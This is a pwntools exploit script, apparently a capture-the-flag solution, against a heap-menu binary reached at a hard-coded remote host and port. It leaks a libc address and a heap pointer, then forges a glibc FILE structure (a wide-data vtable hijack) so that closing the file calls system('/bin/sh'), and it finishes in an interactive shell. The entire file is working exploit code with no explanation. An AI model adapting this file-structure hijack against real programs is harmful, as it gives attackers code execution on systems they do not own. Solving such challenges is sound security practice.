#!/usr/bin/env python3

from pwn import *
from time import sleep, time
import ctypes

exe = ELF("./chall_patched")
libc = ELF('./libc.so.6')

context.binary = exe

REMOTE_NC_CMD    = "nc 193.148.168.30 7669"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *write_file+186
c
b *_IO_wdoallocbuf
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path], env={"LD_PRELOAD":"./libc.so.6"})
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT, env={"LD_PRELOAD":"./libc.so.6"})
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()
    
    def fsrop(fp):
        fs = FileStructure()
        fs.flags = 0x3b01010101010101
        fs._IO_read_ptr = u64(b"/bin/sh\0")
        fs._wide_data = fp + 0x10
        fs._lock = fp-64
        fs.vtable = libc.sym["_IO_wfile_jumps"] + 24 - 0x38

        return bytes(fs) + p64(libc.sym.system) + p64(0) + p64(fp+0xe0-0x68)
    
    def malloc(size):
        r.sendline(b"1")
        r.sendline(bstr(size))

    def free(idx):
        r.sendline(b"4")
        r.sendline(bstr(idx))

    def view(idx):
        r.sendline(b"2")
        r.sendline(bstr(idx))

    def edit(idx, data):
        r.sendline(b"3")
        r.sendline(bstr(idx))
        r.send(data)
        sleep(0.1)

    def open_file():
        r.sendline(b"5") 

    def close_file():
        r.sendline(b"6")
        log.info("CLOSING FILE, MIGHT TAKE A SECOND")
        r.recvuntil(b"Closing chonccfile\nDone")     

    open_file()
    close_file()
    malloc(0x1d8)
    edit(1, b"A"*0x1d0)
    view(1)
    r.recvuntil(b"A"*0x1d0)
    leak = u64(r.recv(6).ljust(8, b"\x00"))
    #gdb.attach(r)
    log.info(f"LEAK @ {hex(leak)}")
    libc.address = leak - libc.sym._IO_wfile_jumps
    log.info(f"LIBC @ {hex(libc.address)}")

    #edit(1, fsrop())

    malloc(20)
    malloc(20)
    malloc(20)
    free(4)
    free(3)
    malloc(20)

    view(3)
    r.recvuntil(b"3: ")
    fp = (u64(r.recv(6).ljust(8, b"\x00")) << 12) + 0x2a0
    log.info(f"FP @ {hex(fp)}")
    
    edit(1, fsrop(fp))

    r.sendline(b"7")
    r.sendline(b"y")

    r.interactive()

if __name__ == "__main__":
    main()